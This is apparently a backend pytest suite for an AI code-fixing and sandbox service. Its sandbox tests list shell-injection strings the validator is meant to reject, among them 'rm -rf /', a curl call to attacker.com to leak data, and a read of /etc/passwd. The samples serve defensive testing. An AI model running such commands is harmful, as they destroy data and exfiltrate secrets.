"""
backend/tests/test_phase7_and_8_ai_and_sandbox.py
-------------------------------------------------
Automated test suite for:
  Phase 7A — Code Error Fixing Pipeline
  Phase 7B — AI Chat Grounding & Voice Assistant
  Phase 7C — 16-Section Documentation Generation & Diagram Validation
  Phase 7D — CI/CD Intelligence & GitOps
  Phase 8  — Sandbox Execution & Security Hardening
"""
from __future__ import annotations

import io
import os
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch
import pytest

# Ensure backend root is on sys.path
backend_root = Path(__file__).parent.parent
if str(backend_root) not in sys.path:
    sys.path.insert(0, str(backend_root))

from fastapi.testclient import TestClient
from main import app
from database import SessionLocal
from models import Repo, RepoFile, Symbol, User
from auth import create_session_token, SESSION_COOKIE_NAME
from codefix.fixer import _clean_diff
from codefix.sandbox import _is_safe_command, _apply_diff_manually, validate_patch
from voice.intent import classify_intent
from docgen.master_doc_gen import (
    validate_mermaid_syntax,
    strip_invalid_mermaid_blocks,
    extract_mermaid_blocks,
)


@pytest.fixture
def db_session():
    session = SessionLocal()
    yield session
    session.close()


@pytest.fixture
def test_user(db_session):
    u = db_session.query(User).filter(User.github_id == "phase7_tester").first()
    if not u:
        u = User(github_id="phase7_tester", github_username="phase7_user")
        db_session.add(u)
        db_session.commit()
        db_session.refresh(u)
    return u


@pytest.fixture
def test_repo(db_session, test_user):
    r = db_session.query(Repo).filter(Repo.id == "phase7_test_repo").first()
    if not r:
        r = Repo(
            id="phase7_test_repo",
            name="phase7_test_repo",
            user_id=test_user.id,
            source_type="upload",
        )
        db_session.add(r)
        db_session.commit()
        db_session.refresh(r)
    elif r.source_type != "upload":
        r.source_type = "upload"
        db_session.commit()
    return r


@pytest.fixture
def client(test_user):
    c = TestClient(app)
    token = create_session_token(test_user.id)
    c.cookies.set(SESSION_COOKIE_NAME, token)
    return c


# ── Phase 7A: Code Error Fixing ──────────────────────────────────────────────

def test_clean_diff_strips_markdown_fences():
    """Diff cleaner must strip markdown code blocks and keep raw unified diff."""
    raw = (
        "Here is the fix:\n"
        "```diff\n"
        "--- a/calculator.py\n"
        "+++ b/calculator.py\n"
        "@@ -1,3 +1,3 @@\n"
        "-def add(a, b): return a - b\n"
        "+def add(a, b): return a + b\n"
        "```\n"
        "Hope this helps!"
    )
    cleaned = _clean_diff(raw)
    assert cleaned.startswith("--- a/calculator.py")
    assert "+def add(a, b): return a + b" in cleaned
    assert "```" not in cleaned
    assert "Here is the fix" not in cleaned


# ── Phase 7B: Voice & Chat Intent Classification ─────────────────────────────

def test_voice_intent_classification():
    """Verify voice intent classifier handles core developer intents."""
    r_explain = classify_intent("explain the function calculate_tax in payments module")
    assert r_explain.intent == "explain_symbol"
    assert "calculate_tax" in r_explain.target.lower()

    r_fix = classify_intent("fix the null pointer exception in authenticate handler")
    assert r_fix.intent == "generate_fix"

    r_doc = classify_intent("generate documentation for the whole repository")
    assert r_doc.intent == "generate_docs"

    r_ask = classify_intent("where is the entrypoint defined")
    assert r_ask.intent == "ask_question"


def test_voice_transcribe_rejects_empty_audio(client):
    """POST /voice/transcribe should reject empty audio payloads with HTTP 400."""
    resp = client.post("/voice/transcribe", files={"audio": ("empty.webm", b"", "audio/webm")})
    assert resp.status_code == 400
    assert "Empty audio" in resp.json()["detail"]


# ── Phase 7C: Documentation & Diagram Validation ─────────────────────────────

def test_mermaid_syntax_validation():
    """Validates Mermaid chart structures and catches broken syntax."""
    valid_flowchart = (
        "flowchart TD\n"
        "    A[Client] --> B[FastAPI Gateway]\n"
        "    B --> C[PostgreSQL Database]\n"
    )
    is_valid, err = validate_mermaid_syntax(valid_flowchart)
    assert is_valid, err

    unbalanced_bracket = (
        "flowchart TD\n"
        "    A[Client --> B[Gateway]\n"
    )
    is_valid_bad, err_bad = validate_mermaid_syntax(unbalanced_bracket)
    assert not is_valid_bad
    assert "Unbalanced" in err_bad

    invalid_header = (
        "not_a_diagram TD\n"
        "    A --> B\n"
    )
    is_valid_inv, err_inv = validate_mermaid_syntax(invalid_header)
    assert not is_valid_inv
    assert "Invalid or missing Mermaid diagram header" in err_inv


def test_strip_invalid_mermaid_blocks():
    """Invalid Mermaid diagrams are stripped while valid diagrams and markdown text are preserved."""
    content = (
        "# System Architecture\n\n"
        "Overview text.\n\n"
        "```mermaid\n"
        "invalidheader TD\n"
        "    A --> B\n"
        "```\n\n"
        "Footer explanation."
    )
    cleaned = strip_invalid_mermaid_blocks(content)
    assert "Overview text" in cleaned
    assert "Footer explanation" in cleaned
    assert "invalidheader" not in cleaned


# ── Phase 7D: GitOps Scoping ──────────────────────────────────────────────────

def test_apply_fix_enforces_tenant_scoping(client, db_session):
    """POST /repos/{repo_id}/apply-fix must return 403 when accessing another user's repository."""
    other_user = db_session.query(User).filter(User.github_id == "other_dev").first()
    if not other_user:
        other_user = User(github_id="other_dev", github_username="other_dev")
        db_session.add(other_user)
        db_session.commit()
        db_session.refresh(other_user)

    other_repo = db_session.query(Repo).filter(Repo.id == "other_private_repo").first()
    if not other_repo:
        other_repo = Repo(id="other_private_repo", name="other_repo", user_id=other_user.id, source_type="upload")
        db_session.add(other_repo)
        db_session.commit()

    resp = client.post(
        "/repos/other_private_repo/apply-fix",
        json={"diff": "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-1\n+2", "file_path": "x.py"},
    )
    assert resp.status_code == 403
    assert "Access denied" in resp.json()["detail"]


# ── Phase 8: Sandbox Hardening & Security ────────────────────────────────────

def test_sandbox_command_whitelist_security():
    """Sandbox must whitelist legitimate test runners and reject shell injection."""
    # Legitimate commands
    assert _is_safe_command("pytest -x -q")
    assert _is_safe_command("python -m pytest tests/")
    assert _is_safe_command("npm test -- --watchAll=false")
    assert _is_safe_command("cargo test -q")

    # Shell injection attacks
    assert not _is_safe_command("pytest; rm -rf /")
    assert not _is_safe_command("pytest && curl http://attacker.com/leak")
    assert not _is_safe_command("pytest || echo evil")
    assert not _is_safe_command("cat /etc/passwd | pytest")
    assert not _is_safe_command("pytest > /dev/null")
    assert not _is_safe_command("`rm -rf *`")


def test_sandbox_validate_patch_rejects_untrusted_command(db_session, test_repo):
    """Sandbox must reject untrusted test commands before execution."""
    storage_dir = backend_root / "storage" / test_repo.id
    storage_dir.mkdir(parents=True, exist_ok=True)
    (storage_dir / "dummy.py").write_text("x = 1\n", encoding="utf-8")

    res = validate_patch(
        repo_id=test_repo.id,
        file_path="dummy.py",
        patched_content="x = 1\n",
        db=db_session,
        test_command="python -c 'import os; os.system(\"rm -rf /\")'; pytest",
    )
    assert not res.passed
    assert "Untrusted test command rejected" in res.error


def test_pure_python_manual_diff_applicator(tmp_path):
    """Verify pure-Python unified diff applicator works cleanly without external patch binary."""
    sample_file = tmp_path / "greeting.py"
    sample_file.write_text("def greet():\n    return 'hello world'\n", encoding="utf-8")

    diff = (
        "--- a/greeting.py\n"
        "+++ b/greeting.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def greet():\n"
        "-    return 'hello world'\n"
        "+    return 'hello production'\n"
    )

    ok, err = _apply_diff_manually(tmp_path, diff)
    assert ok, f"Manual diff application failed: {err}"
    updated_content = sample_file.read_text(encoding="utf-8")
    assert "hello production" in updated_content
    assert "hello world" not in updated_content
